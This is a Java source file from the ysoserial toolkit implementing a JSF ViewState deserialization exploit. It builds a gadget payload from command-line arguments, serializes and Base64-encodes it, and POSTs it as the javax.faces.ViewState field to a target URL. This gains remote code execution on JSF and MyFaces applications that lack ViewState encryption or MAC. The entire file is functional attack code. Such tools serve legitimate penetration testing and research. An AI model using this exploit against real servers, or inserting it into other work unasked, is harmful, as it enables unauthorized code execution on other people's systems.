package ysoserial.exploit;


import org.apache.commons.codec.binary.Base64;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Arrays;


/**
 * JSF view state exploit
 * <p>
 * Delivers a gadget payload via JSF ViewState token.
 * <p>
 * This will only work if ViewState encryption/mac is disabled.
 * <p>
 * While it has been long known that client side state saving
 * with encryption disabled leads to RCE via EL injection,
 * this of course also works with deserialization gadgets.
 * <p>
 * Also, it turns out that MyFaces is vulnerable to this even when
 * using server-side state saving
 * (yes, please, let's (de-)serialize a String as an Object).
 *
 * @author mbechler
 */
public class JSF {

    public static void main(String[] args) {
        if (args.length < 3) {
            System.err.println("Usage: " + JSF.class.getName() + "<view_url> <payload_type> <payload_args...>");
            System.exit(-1);
            return;
        }

        final String[] payloadArgs = Arrays.copyOfRange(args, 2, args.length);

        final Object payloadObject;
        try {
            payloadObject = ObjectPayload.Utils.makePayloadObject(args[1], payloadArgs);
        } catch (Throwable e) {
            if (e instanceof IllegalStateException
                || e instanceof IllegalArgumentException) {
                System.err.println(e.getMessage());
            } else {
                e.printStackTrace();
            }
            System.exit(-1);
            return;
        }

        try {
            URL u = new URL(args[0]);

            URLConnection c = u.openConnection();
            if (!(c instanceof HttpURLConnection)) {
                throw new IllegalArgumentException("Not a HTTP url");
            }

            HttpURLConnection hc = (HttpURLConnection) c;
            hc.setDoOutput(true);
            hc.setRequestMethod("POST");
            hc.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            OutputStream os = hc.getOutputStream();

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(payloadObject);
            oos.close();
            byte[] data = bos.toByteArray();
            String requestBody = "javax.faces.ViewState=" + URLEncoder.encode(Base64.encodeBase64String(data), "US-ASCII");
            os.write(requestBody.getBytes("US-ASCII"));
            os.close();

            System.err.println("Have response code " + hc.getResponseCode() + " " + hc.getResponseMessage());
        } catch (Exception e) {
            e.printStackTrace(System.err);
        }
        Utils.releasePayload(args[1], payloadObject);

    }


}
